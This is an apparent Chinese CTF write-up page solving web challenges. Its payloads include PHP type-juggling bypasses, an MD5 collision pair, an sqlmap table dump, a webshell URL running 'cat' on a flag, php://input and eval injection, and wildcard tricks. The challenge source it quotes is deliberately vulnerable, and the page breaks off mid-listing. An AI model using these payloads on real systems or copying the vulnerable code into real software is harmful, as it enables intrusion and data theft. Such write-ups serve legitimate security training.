class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p><p>源码:<code>easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;fail</code><br>payload:<code>data1[]=1&amp;data2[]=2</code><br>flag{401cf19d304e557349fecda18110c138}</p><h2 id="传个flag试试"><a href="#传个flag试试" class="headerlink" title="传个flag试试"></a>传个flag试试</h2><p><a href="http://114.55.36.69:8012" target="_blank" rel="noopener">http://114.55.36.69:8012</a></p><p>随便ｐｏｓｔ一个ｆｌａｇ参数，提示要１０位以上，提交十位以上直接出答案</p><p>flag{858a14671c27804b63e6e96b0acdfdd7}</p><h2 id="md5-crash"><a href="#md5-crash" class="headerlink" title="md5 crash"></a>md5 crash</h2><p><a href="http://114.55.36.69:8006" target="_blank" rel="noopener">http://114.55.36.69:8006</a></p><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;fail</span><br></pre></td></tr></table></figure></p><p>payload:<code>data1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;data2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></p><p>flag:<code>flag{9bd1ee7355b58e53214adb9a37b4cb82}</code></p><h2 id="简单的新闻搜索网站"><a href="#简单的新闻搜索网站" class="headerlink" title="简单的新闻搜索网站"></a>简单的新闻搜索网站</h2><p><a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p><p>保存请求包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8010</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://114.55.36.69:8010/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">word=123&amp;number=5</span><br></pre></td></tr></table></figure></p><p>paylload:<code>sqlmap -r burp.txt -D news -T admin --dump</code></p><p>flag:<code>flag{f98505d1d12f50a0bd9463e90876630}</code></p><h2 id="省赛添加"><a href="#省赛添加" class="headerlink" title="省赛添加"></a>省赛添加</h2><p><a href="http://www.camser.top/2018/06/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb%E7%AF%87/#ezupload" target="_blank" rel="noopener">http://www.camser.top/2018/06/26/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bweb%E7%AF%87/#ezupload</a></p><p><a href="http://114.55.36.69:8015/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/test.gif.php?code=cat%20../../dc9d7b225e0a391fb028fb337ffd1c1d/f14g" target="_blank" rel="noopener">http://114.55.36.69:8015/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/test.gif.php?code=cat%20../../dc9d7b225e0a391fb028fb337ffd1c1d/f14g</a></p><p>/tmp/upload_td5pr76p91efjs5qcuad4b0q52/<br>/tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5/<br>/tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5/<br>/tmp/upload_ru3o7d9kqb8a14jp0fc2m4a7u5/<br>/tmp/upload_2e5g1d0qainrjqm7se8nv4ife2/</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleZip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $za;</span><br><span class="line">    <span class="keyword">public</span> $debug;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file, $debug = false)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;debug = $debug;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za-&gt;open(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;debug)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Open file &#123;$this-&gt;file&#125;\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">iszip</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;za-&gt;open(<span class="keyword">$this</span>-&gt;file) === <span class="keyword">true</span>)?<span class="keyword">true</span>:<span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">extract</span><span class="params">($dir, $exclude = array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;iszip() === <span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="keyword">$this</span>-&gt;za-&gt;numFiles; $i++) &#123;</span><br><span class="line">                $filename = <span class="keyword">$this</span>-&gt;za-&gt;getNameIndex($i);</span><br><span class="line">                <span class="keyword">if</span>(in_array(basename($filename), $exclude))&#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $pathinfo = pathinfo($filename);</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($dir.<span class="string">'/'</span>.$pathinfo[<span class="string">'dirname'</span>]))&#123;</span><br><span class="line">                    @mkdir($dir.<span class="string">'/'</span>.$pathinfo[<span class="string">'dirname'</span>], <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(file_exists($dir.<span class="string">'/'</span>.$pathinfo[<span class="string">'dirname'</span>]))&#123;</span><br><span class="line">                    copy(<span class="string">"zip://"</span>.<span class="keyword">$this</span>-&gt;file.<span class="string">"#"</span>.$filename, $dir.<span class="string">'/'</span>.$filename);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;debug)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'Extract: '</span>.$dir.<span class="string">'/'</span>.$filename.<span class="string">"\n"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFiles</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $list = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;iszip() === <span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="keyword">$this</span>-&gt;za-&gt;numFiles; $i++) &#123;</span><br><span class="line">                $filename = <span class="keyword">$this</span>-&gt;za-&gt;getNameIndex($i);</span><br><span class="line">                $list[] = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getContents</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="string">"zip://"</span>.<span class="keyword">$this</span>-&gt;file.<span class="string">"#"</span>.$filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;za-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrchr(basename($name), <span class="string">'.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]) &amp;&amp; !$_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>])&#123;</span><br><span class="line">    header(<span class="string">"Content-type: text/plain; charset=utf-8"</span>);</span><br><span class="line">    $ext = getExt($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'文件太大了'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($ext !== <span class="string">'.zip'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'文件格式错误'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">        $file = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $sz = <span class="keyword">new</span> SimpleZip($file);</span><br><span class="line">        <span class="keyword">if</span>(!$sz-&gt;iszip())&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'文件格式错误'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $tmpname = tempnam(sys_get_temp_dir(), <span class="string">'vs.'</span>);</span><br><span class="line">        unlink($tmpname);</span><br><span class="line">        $tmpdir = sys_get_temp_dir().<span class="string">'/'</span>.md5($tmpname);</span><br><span class="line">        mkdir($tmpdir);</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($tmpdir))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'系统错误1'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!$sz-&gt;extract($tmpdir))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'系统错误2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $files = $sz-&gt;getFiles();</span><br><span class="line">        $files_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span>($files <span class="keyword">as</span> $name)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!in_array(getExt($name), <span class="keyword">array</span>(<span class="string">'.jpg'</span>,<span class="string">'.png'</span>,<span class="string">'.jpeg'</span>,<span class="string">'.gif'</span>)) || strpos($name, <span class="string">'.ph'</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                unlink($tmpdir.<span class="string">'/'</span>.$name);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $files_num++;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"/upload/"</span>.md5($tmpname).<span class="string">"/&#123;$name&#125;\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($files_num &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            shell_exec(<span class="string">"mv "</span>.escapeshellarg($tmpdir).<span class="string">" "</span>.escapeshellarg($_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].<span class="string">'/upload/'</span>.md5($tmpname)));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            rmdir($tmpdir);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'没有图片'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="md5爆破脚本"><a href="#md5爆破脚本" class="headerlink" title="md5爆破脚本"></a>md5爆破脚本</h2><p>题目:<code>md5(key)==&quot;5a2a7d385fdaad3fabbe7b11c28bd48e&quot;and the key is ichunqiu[a-z0-9]{5}</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(data)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(data)</span><br><span class="line">    a = m.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">a = <span class="string">'ichunqiu'</span></span><br><span class="line">b = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> b:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> b:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> b:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> b:</span><br><span class="line">                    <span class="keyword">if</span> md5(a+i+j+k+l+m)==<span class="string">'5a2a7d385fdaad3fabbe7b11c28bd48e'</span>:</span><br><span class="line">                        print(a+i+j+k+l+m)</span><br></pre></td></tr></table></figure><h2 id="from-2017-bkctf"><a href="#from-2017-bkctf" class="headerlink" title="from 2017.bkctf"></a>from 2017.bkctf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))    </span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line">       <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:<code>url/?uname[]=1#id=margin</code><br>post:<code>passwd[]=2</code></p><h2 id="TXT"><a href="#TXT" class="headerlink" title="TXT"></a>TXT</h2><p>源题目(from 2017.bkctf)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>方法一：$f = trim(file_get_contents($fn)) 想办法获得一个文本文件fn提取字符串赋值给f.可以在自己的服务器上加个txt内容与ac的get值相等是可以做的…再想出题人不可能让每个做的人去自己服务器写个txt吧…于是在这道题URL框后面加了flag.txt就出现了文本信息“flags”…</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/eqkf85cinr.png?imageView2/2/w/1620" alt=""></p><p>payload:<code>url/?ac=flag&amp;fn=url/flag.txt</code></p><p>方法二：狐火页面工具，运用php输入流，将fn获得的值设置为post进去的值.</p><p>payload:<code>url/?ac=123&amp;fn=php://input</code>,post:<code>123</code></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/dk53cb6bsr.png?imageView2/2/w/1620" alt=""></p><h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>源题目(from 2017.bkctf)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>构造：<a href="http://post.bugku.com/hello/(起始网址)" target="_blank" rel="noopener">http://post.bugku.com/hello/(起始网址)</a> + ?hello=print_r(file(“flag.php”)).</p><h2 id="6-正则？"><a href="#6-正则？" class="headerlink" title="6.正则？"></a>6.正则？</h2><p>源题目(from 2017.bkctf):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明白正则就很简单了，/匹配开始,/key匹配第一个key,.<em>匹配0次或多次的除换行符之外的字符，key再匹配一个key,{4,7}key匹配4次到7次的key,\/.\/中，\为转义字符，即匹配符号//并且之中可匹配除换行符意外的任意字符，(.</em>key)意思与之前相同，[a-z]可匹配a-z的字母，[:punct:]意思为可以匹配符号,/i的意思是不区分大小写。</p><p>payload:<code>keykeykeykeykeykeykey:/a/keys[!]</code></p><p><a href="https://cloud.tencent.com/developer/article/1038132" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1038132</a></p><h2 id="2018安恒杯-9月月赛web"><a href="#2018安恒杯-9月月赛web" class="headerlink" title="2018安恒杯-9月月赛web"></a>2018安恒杯-9月月赛web</h2><p>题目源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>根据代码，我们要满足两个条件：</p><pre><code>1.长度不能大于402.不能包含大小写字母，数字</code></pre><p>参考这篇<a href="https://www.anquanke.com/post/id/154284#h2-3" target="_blank" rel="noopener">文章</a><a href="http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/#Crypto1" target="_blank" rel="noopener">文章2</a>,利用linux的特性来读取文件.<br>根据师傅们的尝试<code>/???/??? =&gt; /bin/cat</code>,所以我们来查看下源码，经过尝试发现<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">function getFlag()&#123;</span><br><span class="line">$flag = file_get_contents(&apos;/flag&apos;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;35)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>分析只要查看到<code>/flag</code>就可以得到flag,所以payload为<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 